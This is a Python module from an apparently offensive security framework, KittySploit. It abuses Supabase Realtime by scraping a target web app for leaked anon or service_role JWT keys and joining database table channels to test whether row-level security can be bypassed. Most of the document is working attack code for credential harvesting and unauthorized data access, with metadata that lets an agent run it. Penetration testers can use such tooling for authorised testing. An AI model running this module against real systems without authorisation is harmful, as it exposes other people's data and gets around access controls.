#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Abuse Supabase Realtime channels using leaked anon/service_role JWT keys.

Follow-up for auxiliary/scanner/http/supabase_api_enum.
"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.supabase_probe import (
    collect_http_bodies,
    extract_supabase_findings,
    mask_token,
)
from lib.scanner.http.supabase_realtime_probe import (
    enumerate_realtime_channels,
    pick_supabase_realtime_credentials,
)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Supabase Realtime Channel Abuse",
        "description": (
            "Joins Supabase Realtime Phoenix channels for PostgREST tables using a "
            "leaked anon or service_role key — tests RLS bypass on live subscriptions."
        ),
        "author": ["KittySploit Team"],
        "tags": ["supabase", "realtime", "websocket", "rls", "enumeration", "auxiliary"],
        "modules": [
            "scanner/http/supabase_key_exposure_detect",
            "auxiliary/scanner/http/supabase_api_enum",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe"],
            "expected_requests": 10,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "exploit_paths"],
            "cost": 1.3,
            "noise": 0.4,
            "value": 1.2,
        },
    }

    project_ref = OptString("", "Supabase project ref", False)
    api_key = OptString("", "Supabase JWT API key", False)
    auto_discover = OptBool(True, "Scrape SPA for Supabase credentials", False)
    max_tables = OptInteger(6, "Max tables/channels to probe", False, advanced=True)

    def run(self):
        ref = str(self.project_ref or "").strip()
        key = str(self.api_key or "").strip()
        role = ""

        if self._to_bool(self.auto_discover) and (not ref or not key):
            bodies = collect_http_bodies(self.http_request)
            merged = "\n".join(t[:200_000] for _p, t in bodies)
            ref, key, role = pick_supabase_realtime_credentials(merged)
            if not ref or not key:
                for _p, text in bodies:
                    for f in extract_supabase_findings(text[:400_000], source=_p):
                        if f.get("token"):
                            ref = ref or str(f.get("project_ref") or "")
                            key = key or str(f.get("token") or "")
                            role = str(f.get("role") or role)

        if not ref or not key:
            print_error("Missing Supabase project_ref and api_key")
            return False

        print_status(f"Supabase Realtime — ref={ref} key={mask_token(key)} role={role or 'unknown'}")
        self._configure_session()
        verify = self._to_bool(self.verify_ssl)
        limit = int(getattr(self.max_tables, "value", None) or self.max_tables or 6)

        findings = enumerate_realtime_channels(
            self.session,
            ref,
            key,
            verify_ssl=verify,
            max_tables=max(1, limit),
        )
        joined = [f for f in findings if f.get("joined")]
        if not joined:
            print_warning("No Realtime channel joins succeeded")
            if findings:
                self.set_info(severity="info", reason="Realtime reachable but channels blocked", findings=findings)
                return True
            return False

        for hit in joined[:5]:
            print_success(f"Joined channel: {hit.get('topic')} (table={hit.get('table')})")

        self.set_info(
            severity="high",
            reason=f"Supabase Realtime: {len(joined)} channel(s) joined without RLS block",
            findings=joined,
            project_ref=ref,
        )
        return True
